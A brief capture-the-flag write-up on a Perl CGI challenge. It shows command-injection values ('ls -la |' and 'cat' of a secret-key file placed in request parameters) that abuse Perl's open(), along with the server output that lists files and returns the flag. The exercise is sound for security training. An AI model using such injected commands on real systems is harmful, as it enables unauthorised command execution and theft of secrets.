Perl's open function executes shell commands after a "|" in the file arguement

So we can do this:
```
http get http://disguise.icec.tf/disguise.cgi "Hacker==; ls -la |" "Mustache==; ls -la |" "Shades==; ls -la |"

HTTP/1.1 200 OK
Cache-Control: no-cache
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Connection: keep-alive
Content-Type: image/bmp; charset=ISO-8859-1
Date: Thu, 13 Aug 2015 20:04:20 GMT
Expires: Thu, 13 Aug 2015 20:04:19 GMT
Last-Modified: Thu, 13 Aug 2015 20:04:19 GMT
Pragma: no-cache
Server: nginx/1.8.0
Transfer-Encoding: chunked

total 604
drwxr-xr-x 5 1001 1001  4096 Aug  6 23:21 .
drwxr-xr-x 6 1001 1001  4096 Aug  6 13:28 ..
-rw-r--r-- 1 1001 1001    38 Aug  6 14:07 SECRET_KEY_159DF48875627E2F7F66DAE584C5E3A5
drwxr-xr-x 2 1001 1001  4096 Aug  6 12:49 css
-rwxr-xr-x 1 1001 1001   437 Aug  6 12:49 disguise.cgi
-rw-r--r-- 1 1001 1001  5140 Aug  6 14:12 disguise.html
drwxr-xr-x 3 1001 1001  4096 Aug  6 12:49 font
-rw-r--r-- 1 1001 1001 54738 Aug  6 12:49 h1.bmp
-rw-r--r-- 1 1001 1001 54738 Aug  6 12:49 h2.bmp
-rw-r--r-- 1 1001 1001 54738 Aug  6 12:49 h3.bmp
-rwxr-xr-x 1 1001 1001   144 Aug  6 13:29 index.cgi
-rw-r--r-- 1 1001 1001  2801 Aug  6 14:13 index.html
drwxr-xr-x 2 1001 1001  4096 Aug  6 15:16 js
-rw-r--r-- 1 1001 1001 54738 Aug  6 12:49 m1.bmp
-rw-r--r-- 1 1001 1001 54738 Aug  6 12:49 m2.bmp
-rw-r--r-- 1 1001 1001 54738 Aug  6 12:49 m3.bmp
-rw-r--r-- 1 1001 1001 54738 Aug  6 12:49 s1.bmp
-rw-r--r-- 1 1001 1001 54738 Aug  6 12:49 s2.bmp
-rw-r--r-- 1 1001 1001 54738 Aug  6 12:49 s3.bmp
-rw-r--r-- 1 1001 1001 54738 Aug  6 12:49 s4.bmp
```

And then this:

```
http get http://disguise.icec.tf/disguise.cgi "Hacker==; cat SECRET_KEY_159DF48875627E2F7F66DAE584C5E3A5 |" "Mustache==; cat SECRET_KEY_159DF48875627E2F7F66DAE584C5E3A5 |" "Shades==; cat SECRET_KEY_159DF48875627E2F7F66DAE584C5E3A5 |"

HTTP/1.1 200 OK
Cache-Control: no-cache
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Connection: keep-alive
Content-Type: image/bmp; charset=ISO-8859-1
Date: Thu, 13 Aug 2015 20:04:41 GMT
Expires: Thu, 13 Aug 2015 20:04:40 GMT
Last-Modified: Thu, 13 Aug 2015 20:04:40 GMT
Pragma: no-cache
Server: nginx/1.8.0
Transfer-Encoding: chunked

flag_why_did_we_stop_using_perl_again
```
